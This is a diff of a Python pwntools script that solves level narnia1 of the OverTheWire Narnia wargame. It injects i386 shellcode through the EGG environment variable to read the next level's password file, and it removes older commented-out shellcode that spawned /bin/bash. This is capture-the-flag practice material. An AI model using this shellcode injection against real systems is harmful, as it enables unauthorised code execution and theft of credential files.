@@ -5,42 +5,40 @@ import getpass
 import sys
 
 # Configuration variables
-user = 'narnia1'
-executable = '/narnia/{}'.format(user)
-host = 'narnia.labs.overthewire.org'
-port = 2226
+config = {
+        'user': 'narnia1',
+        'executable': '/narnia/narnia1',
+        'password_file_path': '/etc/narnia_pass/narnia3',
+        'host': 'narnia.labs.overthewire.org',
+        'port': 2226
+        }
 pwn.context.arch = 'i386'
 pwn.context.os = 'linux'
 
 # Get password for SSH login
 try:
-    password = getpass.getpass(prompt='Narnia2 password: ')
+    password = getpass.getpass(prompt='Narnia1 password: ')
 except Exception as e:
     print('[-] Error getting password: ' + e)
     sys.exit(-1)
 
 # Login to SSH
-s = pwn.tubes.ssh.ssh(host=host,
-                      port=port,
-                      user=user,
+s = pwn.tubes.ssh.ssh(host=config['host'],
+                      port=config['port'],
+                      user=config['user'],
                       password=password)
 
 # Prepare exploit
-# Shellcode: system('/bin/bash')
-# payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f"\
-#         "\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+asm = pwn.shellcraft.i386.linux.cat('/etc/narnia_pass/narnia2')
+shellcode = pwn.asm(asm)
 
-shellcode = pwn.shellcraft.i386.linux.cat('/etc/narnia_pass/narnia2')
-payload = pwn.asm(shellcode)
+payload = shellcode
 
 # Send exploit and get password
-p = s.process(executable=executable,
+p = s.process(executable=config['executable'],
               env={'EGG': payload},
               raw=True)
 print(p.recvall())
-# p.sendline('cat /etc/narnia_pass/narnia2')
-# narnia_password = p.recvline()
-# print('Narnia2: {}'.format(narnia_password.split()[-1]))
-# p.interactive()
+
 p.close()
 s.close()
